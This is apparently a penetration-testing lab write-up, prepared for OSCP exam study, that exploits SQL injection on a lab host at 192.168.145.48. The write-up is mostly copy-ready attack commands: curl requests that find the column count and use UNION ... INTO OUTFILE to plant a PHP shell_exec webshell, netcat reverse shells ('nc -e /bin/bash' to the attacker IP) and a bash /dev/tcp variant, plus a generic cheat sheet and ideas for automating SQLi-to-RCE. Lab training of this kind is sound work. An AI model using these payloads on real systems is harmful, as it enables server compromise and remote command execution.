# SQL Injection to Reverse Shell - Complete Exploitation Guide
**Date**: 2025-10-01
**Target**: 192.168.145.48
**Attack Chain**: SQLi ‚Üí FILE Privilege ‚Üí Webshell ‚Üí Reverse Shell

---

## üöÄ Quick Reference - What Worked

### Successful Exploitation Path
```bash
# 1. Find column count (6 columns)
curl -X POST http://192.168.145.48/index.php -d "mail-list=test@test.com' ORDER BY 7-- -"

# 2. Test file write capability
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' UNION SELECT 'TEST',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/test.txt'-- -"

# 3. Deploy command webshell
curl -X POST http://192.168.145.48/index.php \
  --data-urlencode "mail-list=test@test.com' UNION SELECT '<?php echo shell_exec(\$_GET[\"c\"]); ?>',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/cmd.php'-- -"

# 4. Get reverse shell
nc -lvnp 443  # Listener
curl -G "http://192.168.145.48/cmd.php" --data-urlencode "c=nc -e /bin/bash 192.168.45.179 443"
```

### Key Discoveries
- **Database User**: `gollum@localhost` with FILE privilege
- **Column Count**: 6 columns in vulnerable query
- **Writable Directory**: `/var/www/html/`
- **Shell User**: `www-data` (uid=33)
- **VPN IP**: `192.168.45.179` (found via `ip addr show tun0`)

---

## ‚ùå What Failed & Why

### Failed Attempts Summary
| Method | Failure Reason | Lesson Learned |
|--------|---------------|----------------|
| Direct UNION without column count | "Different number of columns" error | Always enumerate columns first |
| Complex PHP reverse shells | Quote escaping issues in SQL | Simpler payloads work better |
| Python reverse shell in PHP | Path not found (404) | Special characters broke the query |
| bash -i redirection | No connection received | May need different syntax or disabled |

---

## üìö Detailed Exploitation Walkthrough

### Phase 1: Column Enumeration
**Goal**: Determine exact number of columns for UNION injection

#### ORDER BY Method (Successful)
```bash
curl -X POST http://192.168.145.48/index.php -d "mail-list=test@test.com' ORDER BY 7-- -"
```
**Flags Explained**:
- `-X POST`: Specifies HTTP POST method (form submission)
- `-d`: Data to send in POST body
- `ORDER BY 7`: SQL clause to sort by 7th column
- `-- -`: SQL comment to ignore rest of query

**Why This Works**:
- ORDER BY increments test columns until error
- Error at 7 means 6 columns exist
- More reliable than UNION for blind testing

### Phase 2: File Write Testing
**Goal**: Verify FILE privilege and find writable directories

#### Initial Test (Successful)
```bash
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' UNION SELECT 'TEST',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/test.txt'-- -"
```

**SQL Breakdown**:
- `UNION SELECT`: Combines our query with original
- `'TEST',NULL,NULL,NULL,NULL,NULL`: 6 columns (1 string, 5 nulls)
- `INTO OUTFILE`: MySQL command to write query results to file
- `/var/www/html/`: Web root directory (publicly accessible)

**Verification**:
```bash
curl http://192.168.145.48/test.txt
# Output: TEST	\N	\N	\N	\N	\N
```

### Phase 3: Webshell Deployment
**Goal**: Write PHP code for command execution

#### Command Execution Shell (Successful)
```bash
curl -X POST http://192.168.145.48/index.php \
  --data-urlencode "mail-list=test@test.com' UNION SELECT '<?php echo shell_exec(\$_GET[\"c\"]); ?>',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/cmd_1759334715.php'-- -"
```

**Flags Explained**:
- `--data-urlencode`: URL-encodes the data (handles special characters)
- `\$_GET[\"c\"]`: Escaped $ and quotes for shell parsing
- `shell_exec()`: PHP function to execute system commands

**PHP Code Analysis**:
```php
<?php echo shell_exec($_GET["c"]); ?>
```
- `$_GET["c"]`: Reads 'c' parameter from URL
- `shell_exec()`: Executes command and returns output
- `echo`: Displays output to browser

### Phase 4: Reverse Shell Execution
**Goal**: Establish interactive shell access

#### Netcat Reverse Shell (Successful)
```bash
# Listener (Kali)
nc -lvnp 443

# Trigger (via webshell)
curl -G "http://192.168.145.48/cmd_1759334715.php" \
  --data-urlencode "c=nc -e /bin/bash 192.168.45.179 443"
```

**Netcat Flags**:
- `-l`: Listen mode (accept connections)
- `-v`: Verbose output
- `-n`: No DNS resolution (faster)
- `-p 443`: Port to listen on
- `-e /bin/bash`: Execute bash on connection

**Curl Flags**:
- `-G`: Force GET request with data
- `--data-urlencode`: Properly encode the command

---

## üîç Why Each Failed Attempt Failed

### 1. Initial UNION Attempts
```bash
# FAILED
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test' UNION SELECT 'test' INTO OUTFILE '/var/www/html/t.txt'-- -"
```
**Error**: "The used SELECT statements have a different number of columns"
**Reason**: Didn't match original query's 6 columns
**Fix**: Added NULL padding to reach 6 columns

### 2. Complex PHP Reverse Shells
```bash
# FAILED
'<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\""); ?>'
```
**Problem**: Quote nesting and escaping in SQL context
**Issue**: MySQL interprets quotes differently than bash
**Solution**: Used simpler webshell + separate reverse shell command

### 3. Python in PHP Attempts
```bash
# FAILED
'<?php system("python -c \"import socket...\""); ?>'
```
**Error**: 404 Not Found
**Reason**: Complex quote escaping broke SQL syntax
**Learning**: Keep payloads simple, execute complex commands post-exploitation

---

## üõ†Ô∏è Toolkit Script Ideas

### Essential Scripts for SQL Injection Exploitation

1. **sqli_column_counter.sh**
   - Auto-detects column count using ORDER BY and UNION methods
   - Handles both error-based and blind scenarios

2. **file_write_scanner.sh**
   - Tests common web directories for write permissions
   - Checks both INTO OUTFILE and INTO DUMPFILE methods

3. **webshell_deployer.sh**
   - Deploys various webshell types (cmd, upload, full)
   - Auto-generates random filenames to avoid conflicts

4. **reverse_shell_generator.sh**
   - Creates reverse shells for multiple languages (PHP, Python, Perl, Ruby)
   - Adjusts payload based on available interpreters

5. **sqli_to_rce.sh**
   - Complete automation from SQLi to reverse shell
   - Includes fallback methods if primary fails

6. **privilege_enumerator.sh**
   - Checks FILE, SUPER, and other dangerous MySQL privileges
   - Tests actual capability vs reported privilege

7. **blind_data_extractor.sh**
   - Optimized binary search for time-based blind extraction
   - Parallel extraction for multiple fields

8. **mysql_file_reader.sh**
   - Reads system files via LOAD_FILE()
   - Handles large files with chunking

9. **webshell_upgrader.sh**
   - Upgrades simple shells to fully interactive TTY
   - Handles Python, script, and socat methods

10. **post_exploit_enum.sh**
    - Automated enumeration after shell access
    - Finds SUID, capabilities, cron jobs, etc.

---

## üìã Command Cheat Sheet

### Discovery Commands
```bash
# Find VPN IP
ip addr show tun0 | grep inet | awk '{print $2}' | cut -d'/' -f1

# Test SQLi
curl -X POST $TARGET -d "param=value' AND SLEEP(5)-- -"

# Find column count
for i in {1..10}; do
  curl -X POST $TARGET -d "param=value' ORDER BY $i-- -" -s | grep -q "Unknown" && echo "Columns: $((i-1))" && break
done
```

### Exploitation Commands
```bash
# Test file write
curl -X POST $TARGET -d "param=' UNION SELECT 'test',NULL,... INTO OUTFILE '/var/www/html/test.txt'-- -"

# Deploy webshell
curl -X POST $TARGET --data-urlencode "param=' UNION SELECT '<?php system(\$_GET[\"c\"]); ?>',NULL,... INTO OUTFILE '/var/www/html/cmd.php'-- -"

# Get reverse shell
curl "$TARGET/cmd.php?c=nc+-e+/bin/bash+$LHOST+$LPORT"
```

---

## üéØ OSCP Exam Takeaways

### Critical Success Factors
1. **Column enumeration is mandatory** - Never assume column count
2. **Start simple** - Basic webshells before complex payloads
3. **Verify each step** - Test file write before deploying shells
4. **Know your IP** - Always verify VPN IP with `ip addr`
5. **Multiple methods** - Have backups (Python, Perl, PHP, nc)

### Time Management
- Column enumeration: 2 minutes
- File write testing: 5 minutes
- Webshell deployment: 2 minutes
- Reverse shell: 1 minute
- **Total**: ~10 minutes from SQLi to shell

### Manual Methods for Exam
If sqlmap is slow/failing:
1. Use ORDER BY for columns (faster than UNION)
2. Test `/var/www/html/` first (most common)
3. Deploy simple PHP shell (avoid complex escaping)
4. Use nc -e if available (simplest reverse shell)

---

## üìù Final Notes

**Key Learning**: The simpler the payload, the more likely it succeeds. Complex nested quotes and escaping often fail in SQL context.

**Most Valuable Discovery**: FILE privilege + writable web directory = guaranteed RCE

**Exam Strategy**: Focus on command execution first, then upgrade to reverse shell. A working webshell is better than a failed reverse shell attempt.